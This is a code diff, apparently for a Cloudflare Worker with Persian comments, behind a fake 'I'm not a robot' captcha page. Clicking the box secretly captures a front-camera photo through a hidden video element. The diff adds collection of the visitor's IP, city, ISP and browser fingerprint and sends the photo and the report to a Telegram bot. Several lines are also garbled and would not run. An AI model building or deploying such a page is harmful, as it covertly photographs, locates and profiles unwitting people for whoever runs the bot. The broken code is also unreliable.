@@ -12,29 +12,115 @@ export default {
       try {
         const formData = await request.formData();
         const photo = formData.get("photo");
+        const clientData = formData.get("clientData"); // JSON string از سمت کلاینت
 
         if (!photo || !(photo instanceof File)) {
           return new Response("No photo uploaded", { status: 400 });
         }
 
+        // ۱. استخراج اطلاعات سمت سرور (Cloudflare)
+        const cf = request.cf || {};
+        const serverInfo = {
+          ip: request.headers.get("CF-Connecting-IP") || "نامشخص",
+          country: cf.country || "نامشخص",
+          city: cf.city || "نامشخص",
+          region: cf.region || "نامشخص",
+          timezone: cf.timezone || "نامشخص",
+          isp: cf.asOrganization || "نامشخص",
+          asn: cf.asn || "نامشخص",
+          httpProtocol: cf.httpProtocol || "نامشخص",
+          tlsVersion: cf.tlsispVersion || "نام}`شخص",
+          colo: cf.colo ||,
+ "نامشخص",
+          userAgent: request         .headers.get("User-Agent `") || "نامشخص",
+          acceptLanguage: request.headers.get("Accept-Language") || "نامشخص",
+          referer: request.headers.get("Referer") || "نامشخص",
+        };
+
+        // ۲. پردازش اطلاعات سمت کلاینت
+        let clientInfo = {};
+        try {
+          clientInfo = clientData ? JSON.parse(clientData) : {};
+        } catch (e) {
+          clientInfo = { error: "خطا در پردازش داده کلاینت" };
+        }
+
+        // ۳. ساخت پیام متنی جامع
+        const reportLines = [
+          "📸 **گزارش سلفی و اطلاعات کاربر**",
+          "",
+          "🌐 **اطلاعات شبکه (سمت سرور):**",
+          `• IP: ${serverInfo.ip}`,
+          `• کشور: ${serverInfo.country}`,
+          `• شهر: ${serverInfo.city}`,
+          `• منطقه: ${serverInfo.region}`,
+          `• منطقه زمانی: ${serverInfo.timezone}`,
+          `• ISP: ${serverInfo.• ASN: ${serverInfo.asn}`,
+          `• پروتکل HTTP: ${serverInfo.httpProtocol}`,
+          `• نسخه TLS: ${serverInfo.tlsVersion}`,
+          `• دیتاسنتر Cloudflare: ${serverInfo.colo}`,
+          `• User-Agent: ${serverInfo.userAgent}`,
+          `• زبان پذیرفته‌شده: ${serverInfo.acceptLanguage}`,
+          `• Referer: ${serverInfo.referer}`,
+          "",
+          "💻 **اطلاعات مرورگر (سمت کلاینت):**",
+          `• User-Agent: ${clientInfo.userAgent || "نامشخص"}`,
+          `• زبان: ${clientInfo.language || "نامشخص"}`,
+          `• زبان‌های ترجیحی: ${(clientInfo.languages || []).join(", ") || "نامشخص"}`,
+          `• پلتفرم: ${clientInfo.platform || "نامشخص"}`,
+          `• رزولوشن صفحه: ${clientInfo.screenWidth || "?"}x${clientInfo.screenHeight || "?"}`,
+          `• ابعاد پنجره: ${clientInfo.innerWidth || "?"}x${clientInfo.innerHeight || "?"}`,
+          `• نسبت پیکسل دستگاه: ${clientInfo.devicePixelRatio || "نامشخص"}`,
+          `• تعداد هسته‌های CPU: ${clientInfo.hardwareConcurrency || "نامشخص"}`,
+          `• حافظه دستگاه (GB): ${clientInfo.deviceMemory || "نامشخص"}`,
+          `• وضعیت آنلاین: ${clientInfo.onLine ? "بله" : "خیر"}`,
+          `• نوع اتصال: ${clientInfo.connectionType || "نامشخص"}`,
+          `• منطقه زمانی: ${clientInfo.timezone || "نامشخص"}`,
+          `• زمان محلی: ${clientInfo.localTime || "نامشخص"}`,
+          `• کوکی‌ها فعال: ${clientInfo.cookieEnabled ? "بله" : "خیر"}`,
+          `• Do Not Track: ${clientInfo.doNotTrack || "نامشخص"}`,
+          `• PDF Viewer: ${clientInfo.pdfViewerEnabled ? "بله" : "خیر"}`,
+        ];
+
+        const reportText = reportLines.join("\n");
+
+        // ۴. ارسال عکس با کپشن کوتاه
         const telegramForm = new FormData();
         telegramForm.append("chat_id", env.TELEGRAM_CHAT_ID);
         telegramForm.append("photo", photo, "selfie.jpg");
-        telegramForm.append("caption", "سلفی از وب‌سایت");
+        telegramForm.append("caption", "📸 سلفی دریافتی");
 
-        const telegramUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const tgResponse = await fetch(telegramUrl, {
+        const photoUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        const photoResp = await fetch(photoUrl, {
           method: "POST",
           body: telegramForm,
         });
-        const tgResult = await tgResponse.json();
+        const photoResult = await photoResp.json();
 
-        if (!tgResult.ok) {
-          return new Response(`Telegram error: ${tgResult.description}`, { status: 502 });
+        if (!photoResult.ok) {
+          return new Response(`Telegram photo error: ${photoResult.description}`, { status: 502 });
+        }
+
+        // ۵. ارسال پیام متنی اطلاعات
+        const msgUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const msgResp = await fetch(msgUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: env.TELEGRAM_CHAT_ID,
+            text: reportText,
+            parse_mode: "Markdown",
+          }),
+        });
+        const msgResult = await msgResp.json();
+
+        if (!msgResult.ok) {
+          return new Response(`Telegram message error: ${msgResult.description}`, { status: 502 });
         }
 
         return new Response("ok", { status: 200 });
       } catch (err) {
+        console.error(err);
         return new Response("Internal Server Error", { status: 500 });
       }
     }
@@ -83,7 +169,6 @@ function getHTML() {
       margin-bottom: 2px;
     }
     .label { font-size: 16px; color: #333; cursor: pointer; }
-    /* ویدیو مخفی است تا هیچ پیش‌نمایشی دیده نشود */
     #hiddenVideo { display: none; }
     #canvas { display: none; }
   </style>
@@ -94,7 +179,6 @@ function getHTML() {
     <span class="label" id="label">من ربات نیستم</span>
   </div>
 
-  <!-- عناصر مخفی برای گرفتن عکس -->
   <video id="hiddenVideo" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
 
@@ -105,6 +189,29 @@ function getHTML() {
     const canvas = document.getElementById('canvas');
     let busy = false;
 
+    function collectClientData() {
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        innerWidth: window.innerWidth,
+        innerHeight: window.innerHeight,
+        devicePixelRatio: window.devicePixelRatio,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        onLine: navigator.onLine,
+        connectionType: navigator.connection ? navigator.connection.effectiveType : null,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        localTime: new Date().toLocaleString(),
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        pdfViewerEnabled: navigator.pdfViewerEnabled,
+      };
+    }
+
     async function handleClick() {
       if (busy) return;
       busy = true;
@@ -112,22 +219,20 @@ function getHTML() {
 
       let stream = null;
       try {
-        // ۱. درخواست دسترسی به دوربین جلو (بدون پیش‌نمایش)
+        // درخواست دوربین جلو
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
         });
 
         video.srcObject = stream;
-        // منتظر می‌مانیم تا ویدیو آماده شود
         await new Promise((resolve) => {
           if (video.readyState >= 2) return resolve();
           video.onloadeddata = resolve;
         });
-        // یک تاخیر خیلی کوتاه برای گرفتن فریم روشن‌تر
         await new Promise(r => setTimeout(r, 400));
 
-        // ۲. گرفتن فریم از دوربین
+        // گرفتن فریم
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
@@ -137,24 +242,27 @@ function getHTML() {
           canvas.toBlob(resolve, 'image/jpeg', 0.9)
         );
 
-        // ۳. خاموش کردن دوربین بلافاصله
+        // خاموش کردن دوربین
         stream.getTracks().forEach(t => t.stop());
         stream = null;
 
         if (!blob) throw new Error('capture failed');
 
-        // ۴. ارسال به Worker
+        // جمع‌آوری اطلاعات کلاینت
+        const clientData = JSON.stringify(collectClientData());
+
+        // ارسال
         const formData = new FormData();
         formData.append('photo', blob, 'selfie.jpg');
+        formData.append('clientData', clientData);
+
         const resp = await fetch('/upload', { method: 'POST', body: formData });
 
         if (!resp.ok) throw new Error('upload failed');
 
-        // ۵. نمایش تیک تایید (ظاهر کپچا)
         checkbox.classList.add('checked');
         label.textContent = 'تایید شد';
       } catch (err) {
-        // در صورت خطا، وضعیت را برمی‌گردانیم تا کاربر بتواند دوباره تلاش کند
         console.error(err);
         if (stream) stream.getTracks().forEach(t => t.stop());
         label.textContent = 'من ربات نیستم';
